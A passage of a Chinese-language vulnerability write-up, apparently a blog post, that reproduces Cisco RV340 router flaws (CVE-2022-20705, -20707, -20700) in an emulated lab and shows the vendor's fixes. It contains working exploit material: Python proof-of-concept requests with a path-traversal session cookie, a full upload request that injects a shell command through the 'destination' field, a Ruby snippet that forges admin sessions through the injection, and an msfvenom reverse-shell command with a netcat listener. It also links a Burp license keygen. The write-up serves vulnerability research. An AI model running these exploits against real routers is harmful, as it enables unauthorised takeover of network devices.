	upload_set_form_field $upload_field_name.path "$upload_tmp_path";
	upload_aggregate_form_field "$upload_field_name.md5" "$upload_file_md5";
	upload_aggregate_form_field "$upload_field_name.size" "$upload_file_size";
	upload_pass_form_field "^.*$";
	upload_cleanup 400 404 499 500-505;
	upload_resumable on;
}
```

注意第14行代码，if语句会检查`/tmp/websession/token/$cookie_sessionid`文件是否存在，若存在则会将变量`$deny`设置为0以判定会话有效，否则返回403状态码。因为现在模拟环境启动起来了，所以**在登录后**可以查看`$cookie_sessionid`长什么样子，如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659400432237-0dfd280d-680a-4d16-8601-b204bc2a6ad4.png)

对应着浏览器cookie的session条目：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659400866940-f4efabec-66d2-4f02-969e-76b3611e2119.png)

上层目录中名为`session`的文件我也顺便展示了吧，该文件文章后续篇幅中会使用到：

```shell
root@Router:~/rootfs/tmp/websession# cat session 
{
  "max-count":1,
  "cisco":{
    "Y2lzY28vMTkyLjE2OC4yLjEvMjU4MA==":{
      "user":"cisco",
      "group":"admin",
      "time":3062,
      "access":1,
      "timeout":1800,
      "leasetime":15551960
    }
  }
}root@Router:~/rootfs/tmp/websession# 
```

因为if语句检查的是文件是否存在，并不检查文件的合法性。所以只要让`$cookie_sessionid`指向一个恒定的文件，比如`/etc/passwd`，就可以绕过该伪造登录。请注意，该问题并不是nginx配置文件不当导致的路径穿越问题，根本在于因为`if (-f /tmp/websession/token/$cookie_sessionid) {`的`$cookie_sessionid`可控导致穿越，这个问题与Linux的特性有关，比如：

![注意绿色方框](https://cdn.nlark.com/yuque/0/2022/png/574026/1659402377872-25deb423-288b-4ac8-9d8e-91001a168331.png)

写个poc测试下：

```python
import requests
url='https://192.168.2.2/upload'
headers_1={'Cookie':'sessionid=cyberangel'}					# 非法的sessionid
headers_2={'Cookie':'sessionid=../../../etc/passwd'}		# 伪造的sessionid
r_1 = requests.post(url,headers=headers_1,verify=False)
r_2 = requests.post(url,headers=headers_2,verify=False)
print(r_1.text)
print("-"*50)
print(r_2.text)
r_1.close()
r_2.close()
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659680593637-2cfab1f7-18d4-4e31-b172-e1a1e7fff7af.png)

现在返回的状态码是400，这说明第一步我们已经成功绕过但是后续还是有检查。使用IDA逆向可执行文件`upload.cgi`，在main函数中解析sessionid的代码如下

> + 可执行文件中我只恢复了部分符号，没有恢复结构体。对于该固件的upload.cgi：
>     - 解析json使用的是[https://github.com/json-c/json-c](https://github.com/json-c/json-c)
>     - 解析http使用的是[https://github.com/iafonov/multipart-parser-c](https://github.com/iafonov/multipart-parser-c)
> + 链接我就放在这里了，感兴趣自己可以看一下。
>

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659405662023-ee30febb-df65-4f8b-9bd8-1f1e1690e5e7.png)

+ 库函数`strtok_r`可以将字符串按照指定的字符进行分割，例如可将字符串`qemu,cve,cyberangel`按照`,`分割为：`qemu`、`cve`、`cyberangel`。所以for循环就是出现问题的根本，如下：

```c
// strtok_r是strtok的线程安全版本，因此引入了第三个参数save_ptr，这里我们不用管。
  for ( i = strtok_r(v12, ";", &save_ptr); i; i = strtok_r(0, ";", &save_ptr) )	// v12是传入的sessionid
    {
      sessionid = strstr(i, "sessionid=");		// 寻找"sessionid="字符串
      if ( sessionid )
        HTTP_COOKIE_ENV = sessionid + 10;		// 指向真正的sessionid
    }
// #include <string.h>
// char *strtok(char *str, const char *delim);
// char *strtok_r(char *str, const char *delim, char **saveptr);
// char *str是被分割字符串，第一次调用函数strtok_r时此指针不能为空，连续分割同一个字符串时，第一调用之后的调用需将str设置为NULL。
```

还是举个例子比较好，假设当前有`sessionid=../../../etc/passwd;sessionid=Y2lzY28vMTkyLjE2OC4yLjEvMjU4MA==;`，测试代码如下：

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(){
    char* str = "sessionid=../../../etc/passwd;sessionid=Y2lzY28vMTkyLjE2OC4yLjEvMjU4MA==;";
    char* v12 = malloc(0x50);
    strncpy(v12,str,strlen(str));
    char* sessionid = NULL;
    for (char* i = strtok(v12, ";"); i; i = strtok(NULL, ";") ){
        printf("%s\n",i);
        sessionid = strstr(i, "sessionid=");
        if ( sessionid )
            printf("%s\n",sessionid + 10);
    }
    return 0;
}
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659407800406-b962dcf2-b572-441c-815d-7a821d58f65f.png)

最终得到的`HTTP_COOKIE_ENV`为`Y2lzY28vMTkyLjE2OC4yLjEvMjU4MA==;`。下面是一些不痛不痒的检查：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659408162111-5315d2d5-a3dc-4187-a5a6-46c5afc6d532.png)

如此便可成功绕过身份验证，进入upload.cgi的程序逻辑，当然了，如果你POC这样写的话程序仍然返回的是400：

```python
import requests
url='https://192.168.2.2/upload'
headers={'Cookie':'sessionid=../../../etc/passwd;sessionid=Y2lzY28vMTkyLjE2OC4yLjEvMjU4MA==;'}
r = requests.post(url,headers=headers,verify=False)
print(r.text)
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659681675857-7aec0cc8-3f86-4adb-8b17-20fa921f109f.png)

400的原因是因为缺少了一些请求的数据？想到这里我想使用burp抓取流量包，但结果还是出现了问题。

#### 关于`ERR_HTTP2_PROTOCOL_ERROR`
使用burp抓取该路由器固件的流量是抓取不到的：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659683442669-cbb79488-6e42-41dd-9d5e-39ddb8ea1aa7.png)

我尝试着导入burp证书，但还是仍然出现这种错误，无论是使用系统代理还是burp自带的浏览器都无法抓取。经过多次尝试，我最后找到了解决办法。

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659684035733-c52c840c-fa72-4fc2-80ff-27be37ca8636.png)

我平常使用的burp版本是v2021.9，想要抓取到包需要使用旧版本的burp。建议降级jdk版本：

```shell
# ubuntu 18（请先卸载新版本的jdk）
sudo add-apt-repository ppa:webupd8team/java
sudo apt-get update
sudo apt install -y openjdk-8-jdk 
```

> + Burploader：[https://github.com/h3110w0r1d-y/BurpLoaderKeygen](https://github.com/h3110w0r1d-y/BurpLoaderKeygen)（All version supported）
> + 建议使用chrome浏览器
>

使用旧burp再次尝试抓取：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659685444042-2835cb93-a080-45a9-a40e-643b6b10022d.png)

可以！

#### 漏洞解析-part 2
进一步抓取`upload.cgi`，因为路由器前端只是检查了文件的扩展名，所以我们`echo cyberangel > cyberangel.img`创建一个假的镜像上传：

![https://192.168.2.2/index.html#/Admin_File_Management](https://cdn.nlark.com/yuque/0/2022/png/574026/1659687748137-4c1864b4-1d82-443d-b05b-a3c44447e4a6.png)

此时的`upload`请求包为：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659765788133-87dcd786-355f-4696-a83b-b17195df6ccc.png)

该包发送至`Repeater`，更改为`sessionid=../../../etc/passwd; sessionid=cyberangel;`，发包后：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659766009729-9c6cbd25-cb8f-4ef4-ba87-4b8bafc03949.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659766054485-d4f73dc5-7612-4f11-9e22-cd0db3bae785.png)

成功上传文件，表示该漏洞已经生效！

#### 漏洞封堵
该漏洞已在最新版本的`RV34X-v1.0.03.28-2022-06-14-14-17-40-PM.img`修复：

```nginx
location /form-file-upload {
	include uwsgi_params;
	proxy_buffering off;
	uwsgi_modifier1 9;
	uwsgi_pass 127.0.0.1:9003;
	uwsgi_read_timeout 3600;
	uwsgi_send_timeout 3600;
}

location /upload {
    set $deny 0;

    if (-f /tmp/websession/token/$cookie_sessionid) {
            set $deny "${deny}1";
    }

    if ($cookie_sessionid ~* "^[a-f0-9]{64}") {		#  "~*"是nginx修饰符的一种，表示该规则使用正则定义，不区分大小写（将大写字母也包含在内）
            set $deny "${deny}2";									# （抛开修饰符的影响不谈论）对于单独的正则来说^[a-f0-9]{64}，表示匹配至少64个字符，这些连续的字符只能出现数字和小写字母a到f
    }

    if ($deny != "012") {
            return 403;
    }

	upload_pass /form-file-upload;
	upload_store /tmp/upload;
	upload_store_access user:rw group:rw all:rw;
	upload_set_form_field $upload_field_name.name "$upload_file_name";
	upload_set_form_field $upload_field_name.content_type "$upload_content_type";
	upload_set_form_field $upload_field_name.path "$upload_tmp_path";
	upload_aggregate_form_field "$upload_field_name.md5" "$upload_file_md5";
	upload_aggregate_form_field "$upload_field_name.size" "$upload_file_size";
	upload_pass_form_field "^.*$";
	upload_cleanup 400 404 499 500-505;
	upload_resumable on;
}
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659403373484-75238167-0f17-476b-ac43-dbe1186edcb5.png)

最新版本中生成的cookie的规则发生改变，并且也添加上了正则检查，说明该漏洞已经被封堵。

### ②、关于该固件的gdb调试（调试子进程）
在讲解下一个CVE之前，我先阐述下关于该固件的upload.cgi的gdb调试方法。因为upload.cgi是uwsgi的子进程，所以我们不能直接启动upload.cgi调试，若要如此则会可能丢失一些父进程传给子进程的环境变量等重要参数：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659589400296-0dfb9243-aa2e-4e3b-8f26-dcb013215ef3.png)

具体方法为，在main函数的`if(CONTENT_LENGTH_ENV)`语句对应的汇编中，将跳转的目的地址改为不影响程序流程的地方：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659767540322-7c7aee3b-ac6c-4db5-a4cb-afcf6032a449.png)

在这里我将BL跳转指令修改为跳转到自身，陷入死循环：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659768265009-09797523-ae03-40b1-b8cf-a4b474872b88.png)

![修改后](https://cdn.nlark.com/yuque/0/2022/png/574026/1659768276481-6a0cc351-d4ba-4bae-b9e1-96bccd37cef8.png)

将修改后的可执行文件保存导出，上传到qemu对应的文件夹：

![记得chmod 777 ./upload.cgi](https://cdn.nlark.com/yuque/0/2022/png/574026/1659769287387-57e1223e-ce7e-4b5c-a604-4976a355fc08.png)

接下来还需要使用到与架构匹配的gdbserver，下载链接：[https://github.com/therealsaumil/static-arm-bins/blob/master/gdbserver-armel-static-8.0.1](https://github.com/therealsaumil/static-arm-bins/blob/master/gdbserver-armel-static-8.0.1)

> + 下载完成后使用ssh上传到qemu中，记得赋予可执行权限哦。
>

使用burp发包，此时upload.cgi会陷入死循环：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659769402550-20c4bac9-dd7e-45d8-80e6-97d41c03d7b1.png)

gdb attach`/root/gdbserver-armel-static-8.0.1 192.168.2.2:8888 --attach 28019`上去，因为qemu属于虚拟机的内部网络，所以路由器后台只能在虚拟机访问，无法在宿主机访问。为了调试，我使用看雪的KSA将虚拟机映射到公网，从而在宿主机实现访问（我用手机自己开的热点）：

> + 虚拟机要设置为桥接模式
>

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659772551481-65e1e6f3-9dcf-4640-87cf-49997c20bcc1.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659772596112-4c672823-01dc-4d5b-b293-7e1f0485026d.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659772697548-b8184c2e-124f-40a2-b33b-5dec4ebf2266.png)

修改代码段的机器码`FE FF FF EB`修改为`AD FF FF EB`（右键 -> Edit -> 修改数据【直接按键盘】 -> 右键 -> Apply changes）【有时候会修改不成功，请重启IDA多试几次】:

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659776069123-118a929b-39f6-43b8-89d6-708c00c3ca99.png)

效果如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659776130686-7388b968-6aa4-4f4d-9c72-b4ced45ae5c5.png)

接下来按下F8键单步步过之后就可以调试了。

> 记得把原来的可执行文件备份一下。
>

### ③、CVE-2022-20707（未授权命令执行）
> + **<font style="color:#E8323C;">我的建议是不到迫不得已的时候不要调试，因为这种调试方式十分的耗时间，并且一旦调试不好就得重新启动upload.cgi。</font>**
> + **<font style="color:#E8323C;">想要避免麻烦记得替换sessionid</font>**
>

#### 漏洞解析
你可能注意到，`upload`的返回包为`Error Input`，最后在浏览器上弹出提示：`<font style="color:rgb(34, 34, 34);">/tmp/firmware/file001 does not exists</font>`<font style="color:rgb(34, 34, 34);">：</font>

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659687871981-891ba5f5-a3b7-4323-a32b-a1decba99d18.png)

我们注意到在此过程中发送了两个请求包：

![upload -- Error Input](https://cdn.nlark.com/yuque/0/2022/png/574026/1659687993560-75450ff1-c966-4d49-b6c3-ad56a2179548.png)

![jsonrpc](https://cdn.nlark.com/yuque/0/2022/png/574026/1659688012713-73cbe25c-5c99-4bc0-8ed0-e37ea5800975.png)

解决这个问题最终还是得回到IDA。第一处`Error Input`出现在`file_path`为空时：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659688714458-742cfa6e-8ce1-4c36-9a37-b551eea304aa.png)

第二处`filename`通过`getFilePath`函数得到的文件储存路径为空时打印出来的Error Input：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659689301699-4dfb96fc-7667-4944-97f2-0d1da41587b5.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659689858755-7d00d882-3152-4b3f-aa40-10f713674054.png)

先来鉴别最简单的第二处，因为上传的是固件，所以getFile的第一个参数为"Firmware"：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659690317713-cb97f668-f54d-463e-adac-71892fa920b8.png)

但这个文件路径似乎是不存在的，曾经nginx启动的时候就报的是这个错误：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659690490980-4ca0551c-4699-4e98-9d65-5a73e0114e68.png)

依葫芦画瓢，创建`/tmp/firmware/`文件夹（"/var/"目录软连接到"/tmp/"）并设置文件夹的权限：

+ `mkdir ./firmware/`
+ `chmod 755 ./firmware` 
+ `chown www-data:www-data ./firmware `

需要设置的权限和用户组如下图所示：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659690581826-9bcb9b64-75ff-47dc-9d10-e8a6536d7c87.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659706225060-2aff300c-358c-4771-be88-ac8abfe12ae1.png)

最终效果如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659763546572-0015aee2-fa5b-4d9d-87b8-e5f2bd874bb4.png)

**<font style="color:#E8323C;">注意，现在的upload文件夹是有东西的，一旦firmware文件夹创建完成，上传校验失败后我们上传的文件会被自动删除，程序的流程本就是如此：</font>**

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659763619599-011af165-cade-434e-bc8f-7077f23de8b6.png)

再次上传可以验证一下嘛：`echo test > test.img`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659763797974-4a1ebcc9-3376-4f7a-8e9e-f87320166581.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659763821941-21ecdeca-75e0-46d7-ad95-08b61449eb10.png)

这次的报错变了，`Error Input`不会再出现，这表明正是`firmware`文件夹缺失的问题：

![upload响应包](https://cdn.nlark.com/yuque/0/2022/png/574026/1659763957211-618c0102-5125-4db3-a6dd-b17bb6bf40d5.png)

![jsonrpc响应包​​​​​​](https://cdn.nlark.com/yuque/0/2022/png/574026/1659764258132-3278d443-9885-48e1-ac7b-33ac8b2e019f.png)

---

**<font style="color:#E8323C;">------------------------------------------------------------------------------</font>**

**<font style="color:#E8323C;">无论是否创建firmware文件夹，在upload的包之后还会发送一个</font>**`**<font style="color:#E8323C;">jsonrpc</font>**`**<font style="color:#E8323C;">的包，这两种情况的包完全一致，没有任何区别：</font>**

![jsonrpc请求包](https://cdn.nlark.com/yuque/0/2022/png/574026/1659764162156-c5d58c22-2e0d-44e3-84f7-2dcedd18e129.png)

```json
{
    "jsonrpc": "2.0",
    "method": "action",
    "params": {
        "input": {
            "fileType": "firmware",
            "source": {
                "location-url": "FILE://Firmware/file001"
            },
            "firmware-option": {
                "reboot-type": "none"
            },
            "destination": {
                "firmware-state": "inactive"
            }
        },
        "rpc": "file-copy"
    }
}
```

**这不能代表程序进入了之后的**`**firmwareUpload**`**函数并执行了curl，虽然这个请求包也是和那两种情况的包一样的...**

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659764570636-73c15614-1fc2-4445-83a1-b3f83eca2a63.png)

**仔细想想，burp怎么可能能抓到curl 127.0.0.1即路由器（qemu）内部的包呢？它只能抓到的是虚拟机和qemu之间的包。就仅仅这里耗费了我很长时间...最后贴几张gdb调试的证据：**

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659781499334-5e7cd48b-501f-4782-ab3d-fc5c1f0ec305.png)

![未创建firmware](https://cdn.nlark.com/yuque/0/2022/png/574026/1659782257296-e373cdea-27bb-45dc-a85f-f68f9b1b1329.png)

**<font style="color:#E8323C;">------------------------------------------------------------------------------</font>**

---

回到这个CVE，对照IDA，创建`firmware`文件夹后有如下流程`main -> sub_12684 -> firmwareUpload`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659764453741-7619e90a-8fbd-4378-a4a0-f3e8af86c564.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659764505115-7dd290b8-eb58-4954-ba87-dea84a3c7e15.png)

firmwareUpload函数返回后就会调用system拼接执行，第三个参数可控，所以这里存在命令执行漏洞：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659493307912-86c229c9-9148-4e18-a2b5-7cc91319dc36.png)

但我们还是要注意外层的检查：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659493233342-ba42af7c-8cd2-4cbc-93c2-75b9b8034665.png)

注意这里我们伪造的cookie要加长一下，不能少于16个字符

![16个字符](https://cdn.nlark.com/yuque/0/2022/png/574026/1659787970106-2b4c5140-390a-4e25-ae37-a91e45453769.png)

![15个字符](https://cdn.nlark.com/yuque/0/2022/png/574026/1659787992654-568d6e5f-e99f-4016-a654-b6059ff11d59.png)

这是因为：**<font style="color:#E8323C;">C语言的strlen的返回值为</font>**`**<font style="color:#E8323C;">size_t</font>**`**<font style="color:#E8323C;">，为无符号值，所以如果sessionid长度小于16，则导致最终的502 Bad Gateway（找了半天才发现问题，但是这也从侧面证明了第二个请求包不是由upload.cgi发送，因为sessionid长度压根不对）。</font>**

> **<font style="color:#E8323C;">一个流量包差点给我绕晕过去....我真菜</font>**
>

```c
#include <stdio.h>
#include <string.h>
int main(){
    char *str1 = "cyberangelcyber";
    char *str2 = "cyberangelcybera";
    printf("%d\n",strlen(str1) - 16 <= 0x40);
    printf("%d\n",strlen(str2) - 16 <= 0x40);
    return 0;
}
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659788326428-607f3e2a-e606-434c-85f6-3aec8f8413c1.png)

sprintf的第三个参数为firmwareUpload函数json对象：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659790625061-2327a2f9-6994-40db-8c59-debf7ba9f772.png)

完整的调用链为：

```c
sub_12684(HTTP_COOKIE_ENV, destination, option, file_type, v24, cert_name, cert_type, password);
--> v14 = firmwareUpload(destination, v24, option);
```

并且`destination`与`option`均可由用户控制：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659791069981-5d1200cf-fc6b-4264-b2b5-3e33211a5b3c.png)

所以有：

```c
POST /upload HTTP/1.1
Host: 192.168.2.2
Connection: close
Content-Length: 751
sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
Accept: application/json, text/plain, */*
optional-header: header-value
sec-ch-ua-mobile: ?0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0qV1TDWAdjvfv83n
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: https://192.168.2.2
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.2.2/index.html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: selected_language=English; session_timeout=false; sessionid=../../../etc/passwd; sessionid=cyberangelcybera; user=cisco; blinking=1; config-modified=1; disable-startup=0; redirect-admin=0; group=admin; attributes=RW; ru=0; bootfail=0; model_info=RV340; fwver=; current-page=Admin_File_Management

------WebKitFormBoundary0qV1TDWAdjvfv83n
Content-Disposition: form-data; name="sessionid"

EU6DJKEIWO
------WebKitFormBoundary0qV1TDWAdjvfv83n
Content-Disposition: form-data; name="pathparam"

Firmware
------WebKitFormBoundary0qV1TDWAdjvfv83n
Content-Disposition: form-data; name="fileparam"

file001
------WebKitFormBoundary0qV1TDWAdjvfv83n
Content-Disposition: form-data; name="file"; filename="cyberangel.img"
Content-Type: application/x-raw-disk-image

cyberangel

------WebKitFormBoundary0qV1TDWAdjvfv83n
Content-Disposition: form-data; name="destination"

test_padding';ls;'
------WebKitFormBoundary0qV1TDWAdjvfv83n
Content-Disposition: form-data; name="option"

test_padding

------WebKitFormBoundary0qV1TDWAdjvfv83n--
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659791583955-212b9679-eb35-47ce-8aa7-3c1343482dcf.png)

注意`option`必须存在，哪怕为空都行，**<font style="color:#E8323C;">因为这里判断的是指针而不是其内容，厂商属于是判断了个寂寞</font>****：**

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659791628105-5fd03964-acdc-4807-bb0c-12af89769f99.png)

#### 漏洞封堵
最后我们来看一下最新版本是怎么修复这个漏洞的：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659792313059-df2121af-fcc8-499d-bcf0-6b06e854d9dd.png)

对参数进行限制，无话可说。

### ④、CVE-2022-20700（会话伪造）
#### 漏洞解析
![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659842678189-c31abbd1-f6c0-4436-827e-b392e11acd3f.png)

sessionid是有时效的，但是我们可通过命令执行漏洞上传恶意的脚本文件来伪造sessionid，脚本如下：

```shell
fake_username = "Cyberangel"
admin_sessionid =base64.encode64("#{fake_username}/#{http.local_address}/#{uptime_seconds}").gsub("\n","")
websessions = % Q[{
    "max-count":1,
    "#{fake_username}" :{
        "#{admin_sessionid}":{
        "user":"#{fake_username}",
        "group" :"admin",
        "time" :#{uptime_seconds},
        "access" : 1,
        "timeout" :1800,
        "leasetime" :0
        }
    }
}]

websessions.gsub!("\n", "\\n")
result = cisco_rv340_wwwdata_command_injection(http, "echo -n -e#{websessions} > /tmp/websession/session; echo -n 1")
if (result.nil ? or result.to_i != 1)
    $stdout.puts("[-] Failedcreate /tmp/websession/session") if @verbose
    return nil
end
result = cisco_rv340_wwwdata_command_injection(http, "touch/tmp/websession/token/#{admin_sessionid}; echo -n 1") 
```

注意，伪造的时候需要伪造两个文件：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659841971857-b3aa8904-2b80-44c3-98d4-20341c0211be.png)

#### 漏洞封堵
没有命令执行，何来会话伪造？

### ⑤、msf反弹shell
**从前面的篇幅可以知道，当/tmp/firmware文件夹存在时，固件升级失败后会将upload文件夹中对应的上传内容清空；但是当不存在时，则会**`**Error Input**`**无法命令执行。想要绕过这一点可以使用如下方法：**

> **上传会话伪造脚本使用的就是这种方法。**
>

正常情况下真实环境中路由器的`/tmp/signature`文件夹是存在的，与`/tmp/firmware`性质一样，所以我们可以命令执行删除`signature`文件夹，然后上传，这样我们upload里的文件就保留了。使用使用kali的msf生成反向shell：`msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.2.1 LPORT=31337 -f elf -o msf-arm`，上传：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659843182022-fdf3d824-52fd-426d-8cd1-dcd31329e585.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659843420769-840a7c47-e96e-40ee-93c6-664c9bce86e8.png)

**授予可执行权限：**

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659843520799-ad4a7d00-d50d-48a1-b518-0d59fa45e435.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659843552767-8a78912a-6dfe-4b8a-8c0c-ca21e4e04b10.png)

**本机nc监听后执行程序：**

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659843732161-08a8580b-c4e5-4c8e-a0ae-460a3f0fb1fe.png)

完成。

# 3、参考资料（PDF）
> + [https://bestwing.me/Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html#Related-vulnerability-tracking](https://bestwing.me/Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html#Related-vulnerability-tracking)
> + [https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247484452&idx=1&sn=1b6f10f8f1a1dd76134251b2b79ca0fe&chksm=c2a1d0adf5d659bb6ac6c64642cd745499c11ac98b539f4d2faa4392085b5756cf81cc30e8c7&mpshare=1&scene=1&srcid=05138YZTtUf1uWLemQEPQVJG&sharer_sharetime=1652415617946&sharer_shareid=e2810228000aab536ea6dcae2afc9cd8&version=4.0.6.6516&platform=win#rd](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247484452&idx=1&sn=1b6f10f8f1a1dd76134251b2b79ca0fe&chksm=c2a1d0adf5d659bb6ac6c64642cd745499c11ac98b539f4d2faa4392085b5756cf81cc30e8c7&mpshare=1&scene=1&srcid=05138YZTtUf1uWLemQEPQVJG&sharer_sharetime=1652415617946&sharer_shareid=e2810228000aab536ea6dcae2afc9cd8&version=4.0.6.6516&platform=win#rd)
> + [https://blog.relyze.com/2022/04/pwning-cisco-rv340-with-4-bug-chain.html](https://blog.relyze.com/2022/04/pwning-cisco-rv340-with-4-bug-chain.html)
> + [http://www.ctfiot.com/1159.html](http://www.ctfiot.com/1159.html)
>

[Cisco RV340命令执行漏洞（CVE-2022-20707）及关联历史漏洞分析.pdf](https://www.yuque.com/attachments/yuque/0/2022/pdf/574026/1659844560657-e27f2e4e-4cc9-4b9e-a8ee-dafca8238ad3.pdf)

[Cisco RV路由器设备模拟仿真 _ CTF导航.pdf](https://www.yuque.com/attachments/yuque/0/2022/pdf/574026/1659844555471-ce1202b2-50d9-4a10-8c9b-59548db47862.pdf)

[Pwning a Cisco RV340 漏洞分析（CVE-2022-20705 和 CVE-2022-20707.pdf](https://www.yuque.com/attachments/yuque/0/2022/pdf/574026/1659844554908-0306d874-a3ef-4e24-965c-369f7fb35432.pdf)

[Relyze Software Limited - Advanced Software Analysis_ Pwning a Cisco RV340 with a 4 bug chain exploit.pdf](https://www.yuque.com/attachments/yuque/0/2022/pdf/574026/1659844554355-b8bbca15-6703-437a-b048-d95d367142d9.pdf)

